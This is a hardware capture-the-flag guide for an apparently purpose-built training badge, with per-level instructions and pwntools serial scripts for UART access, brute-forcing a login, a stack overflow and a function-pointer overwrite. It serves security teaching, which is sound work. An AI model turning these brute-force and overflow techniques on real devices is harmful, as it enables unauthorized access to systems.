# Hardware CTF 2

![](https://busside.com.au/assets/img/gg/Hwctf-2.png)

This is the Hardware CTF 2 for the Cyber Skills Challenge.

Register your name/handle with InfoSect CTF to track your progress and compare yourself to others [http://ctf.infosectcbr.com.au:8000].

Solve each level to get the flag. Once you have the flag, enter it into the CTF to get your points.

## How to assemble

No assembly is required. You just need a USB-C cable to power the board.

## How to install the software

No software is required to flash the board. But you'll probably want to solve the challenges on a Linux machine or VM that has Python3 and pwntools installed.

## Level -

Run strings on the firmware and grep for 'flag{'.

## Level 0 Easy 123

One short press on the button to scroll down the menu and one long press to select the level. You need to be on the selected level to activate that particular level challenge.

If you can power up the badge, this will be enough to get the flag!

## Level 1 UART

You will need to interface via UART. The pinout and line settings are given. Use a serial-uart bridge. We recommend and have tested with [https://www.jaycar.com.au/arduino-compatible-usb-to-serial-adaptor-module/p/XC4464].

To use the usb to serial adapter (the BUSSide for the Cyber Skills Challenge), connect TXD/TX, RXD/RX, and GND/Ground.

Open up minicom in a Linux terminal. Assuming the USB serial adapter is on /dev/ttyUSB0 use the following. If the adapter is on /dev/ttyUSB1 or elsewhere, use that instead.

```
$ sudo apt-get install minicom
$ sudo minicom -D /dev/ttyUSB0
```

Type ctrl-a, then 'z' on it's own. This will enter you into the menu system.

Type 'o' which will enter you into the configuration. Scroll down to the serial port setup and hit enter.

Type 'f' to turn off software flow control. If you don't do this, you will not be able to interface correctly.

Change the baud rate to 9600.

Exit out of the menu system.

Do you get readable text from your UART connection?

## Level 2 Simon Says

In this exercise, you will use pwntools to programtically interface with the Hardware CTF. Pwntools is mostly used in exploit development, but we will use to interface over the serial interface.

You might need to install it in Linux

```
$ sudo apt-get install python3-pip
$ sudo pip3 install pwntools
```

Firstly, try interacting with the Hardware CTF using minicom. After you see how the challenge works, it's time to move onto programatically interfacing with it.

To make pwntools use the serial interface, we need to use the serialtube.

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)
```

We can also send and receive lines on the serial interface using the sendline and recvline APIs.

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)
io.sendline("")
line = io.readline()
print(line.decode("utf-8"))
```

Now we can interface with the Hardware CTF to repeat the things it wants us to say:

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)
io.sendline("")
while True:
    line = io.readline()
    print(line.decode("utf-8"))
    if line.find(b"REPEAT") >= 0:
        keyword = line[line.find(b"REPEAT") + 18:len(line)-3]
        io.sendline(keyword)
```

## Level 3 Brute

In this challenge you have to brute force a login. The solution follows a similar pattern to Level 2 Simon Says. That is, use pwntools to programtically attempt logins with the provided password word list.

Here is a skeleton program to get you started

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)

io.sendline("")
with open("passwords.txt") as f:
    for password in f.readlines():
        line = io.recvuntil(b"PASSWORD: ")
        print(line.decode("utf-8"))
        print("Trying password " + password)
        io.sendline(password)
        print(io.readline().decode("utf-8"))
        line = io.readline()
        print(line.decode("utf-8"))
        if line.find(b"INCORRECT") < 0:
           ## Finish this code
```

## Level 4 Stack Smash

This level has a stack overflow. If you select the contents of the buffer correctly, you can bypass the authentication.

Try the following code as a template. When you know what you have to modify the buffer to, fix the exploit and grab the flag.

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)

io.sendline("")
line = io.recvuntil(b"PASSWORD: ")
print(line.decode("utf-8"))
io.sendline(b"abcdefghijklmnopqrstuvwxyz" )
while True:
    print(io.recvline().decode("utf-8"))
```

## Level 5 Function

This level requires you to build a ROP-style exploit from a buffer overflow!

Directly adjacent to the buffer that is overflowed is a function pointer that gets called. If you can overwrite the function pointer with the address of another function, you can hijack control flow.

The Hardware CTF needs to be interfaced in a very specific way to receive the buffer. It firsly reads 1 byte and uses this as a size field. It then reads 'size' bytes and copies it into the buffer. Here is an example of how to send a buffer.

```
#!/usr/bin/python3

from pwn import *

io = serialtube('/dev/ttyUSB0', baudrate=9600, convert_newlines = False)

return_address = b"\xc6\x15\xc6\x15\xc6\x15"

line = io.recvuntil("SEND 1 BYTE LENGTH:")
print(line.decode("utf-8"))
io.send(chr(len(return_address)))
line = io.recvuntil("SEND DATA:")
print(line.decode("utf-8"))
io.send(return_address)
line = io.recvuntil("DONE")
print(line.decode("utf-8"))
while True:
    print(io.recvline().decode("utf-8"))
```

In this level, you want to overflow the buffer, overwrite a function pointer and redirect execution to the ROP_print_flag function. This will print the flag for this level.

How do you find the address to use when overwriting the function pointer? Firstly, you will need to install avr-binutils.

```
$ sudo apt-get install binutils-avr
```

Now, disassemble the firmware image (which is an ELF binary).

```
$ avr-objdump -D firmware.elf

..
0000xx8c <_Z14ROP_print_flagv>:
    xx8c:       c0 91 cf 05     lds     r28, 0x05CF     ; 0x8005cf <ser>
    xx90:       d0 91 d0 05     lds     r29, 0x05D0     ; 0x8005d0 <ser+0x1>
    xx94:       87 ed           ldi     r24, 0xD7       ; 215
    xx96:       91 e0           ldi     r25, 0x01       ; 1
    xx98:       0e 94 76 04     call    0x8ec   ; 0x8ec <_ZL5do_dePKcPc.constprop.40>
```

Note, that the symvbol name for ROP_print_flag has been mangled (due to C++ name mangling). But the above symbol represents the correct one.

In AVR, an address is a 16-bit value. Function pointers are not stored using these address as is. In fact, AVR instructions always aligned to 16-bits, so a space saving the microcontroller does, is store code addresses as their full address divided by 2 (since all code addresses are 2-byte aligned).  Thus, if an address of a function was at 0x4002, then a function pointer to that code would store 0x2001. Also note that the Hardware CTF micocontroller is little endian, so the contents of the function pointer would actually be "\x01\x20".

Additionally, instead of trying to figure out the exact size of the buffer overflow, why not just send 15 2-byte addresses. Remember to divide the addresses by 2 and store it in a little endian format.
